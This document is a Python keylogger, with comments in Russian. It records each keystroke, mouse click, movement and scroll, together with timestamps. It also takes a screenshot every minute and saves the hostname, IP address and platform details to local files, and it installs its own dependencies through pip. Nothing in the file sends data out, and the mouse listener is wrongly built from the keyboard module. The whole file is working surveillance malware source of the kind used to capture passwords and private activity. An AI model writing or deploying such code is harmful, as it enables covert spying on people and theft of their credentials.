import logging
import os
import platform
import socket
import threading
import pyscreenshot
from pynput import keyboard
from pynput.keyboard import Listener
from datetime import datetime
import glob

# Настройка логирования
LOG_FILE = "keylog.txt"
SCREENSHOT_DIR = "screenshots"
SYSTEM_INFO_FILE = "system_info.txt"

class KeyLogger:
    def __init__(self, time_interval):
        self.interval = time_interval
        self.log = ""
        self.create_dirs()
        
    def create_dirs(self):
        """Создает необходимые директории"""
        if not os.path.exists(SCREENSHOT_DIR):
            os.makedirs(SCREENSHOT_DIR)

    def append_to_file(self, filename, content):
        """Добавляет содержимое в файл"""
        with open(filename, "a", encoding="utf-8") as f:
            f.write(content + "\n")

    def on_move(self, x, y):
        current_move = f"[{datetime.now()}] Mouse moved to {x} {y}"
        self.append_to_file(LOG_FILE, current_move)

    def on_click(self, x, y, button, pressed):
        action = "pressed" if pressed else "released"
        current_click = f"[{datetime.now()}] Mouse {action} {button} at {x} {y}"
        self.append_to_file(LOG_FILE, current_click)

    def on_scroll(self, x, y, dx, dy):
        current_scroll = f"[{datetime.now()}] Mouse scrolled at {x} {y} ({dx}, {dy})"
        self.append_to_file(LOG_FILE, current_scroll)

    def save_key(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            special_keys = {
                keyboard.Key.space: "SPACE",
                keyboard.Key.esc: "ESC",
                keyboard.Key.enter: "ENTER",
                keyboard.Key.tab: "TAB",
                keyboard.Key.backspace: "BACKSPACE"
            }
            current_key = special_keys.get(key, f"[{key}]")

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.append_to_file(LOG_FILE, f"[{timestamp}] {current_key}")

    def system_information(self):
        """Записывает системную информацию в файл"""
        info = [
            f"System Information [{datetime.now()}]",
            f"Hostname: {socket.gethostname()}",
            f"IP: {socket.gethostbyname(socket.gethostname())}",
            f"Processor: {platform.processor()}",
            f"System: {platform.system()}",
            f"Machine: {platform.machine()}",
            f"Platform: {platform.platform()}",
            "-"*50
        ]
        
        with open(SYSTEM_INFO_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(info))

    def take_screenshot(self):
        """Делает скриншот и сохраняет в папку"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png")
        
        try:
            img = pyscreenshot.grab()
            img.save(filename)
            self.append_to_file(LOG_FILE, f"[{datetime.now()}] Screenshot saved: {filename}")
        except Exception as e:
            self.append_to_file(LOG_FILE, f"[{datetime.now()}] Screenshot error: {str(e)}")

    def report(self):
        """Периодически сохраняет данные"""
        self.take_screenshot()
        self.system_information()
        
        # Запускаем таймер снова
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def run(self):
        """Запускает логгер"""
        self.system_information()
        self.append_to_file(LOG_FILE, f"[{datetime.now()}] Keylogger started")
        
        # Запускаем периодические задачи
        self.report()
        
        # Слушаем клавиатуру
        keyboard_listener = keyboard.Listener(on_press=self.save_key)
        keyboard_listener.start()
        
        # Слушаем мышь
        mouse_listener = keyboard.Listener(
            on_click=self.on_click,
            on_move=self.on_move,
            on_scroll=self.on_scroll)
        mouse_listener.start()
        
        # Ожидаем завершения
        keyboard_listener.join()
        mouse_listener.join()

if __name__ == "__main__":
    SEND_REPORT_EVERY = 60  # секунды
    
    # Проверяем и устанавливаем необходимые модули
    try:
        import pyscreenshot
        import pynput
    except ImportError:
        import subprocess
        subprocess.run(["pip", "install", "pyscreenshot", "pynput"], check=True)
    
    logger = KeyLogger(SEND_REPORT_EVERY)
    logger.run()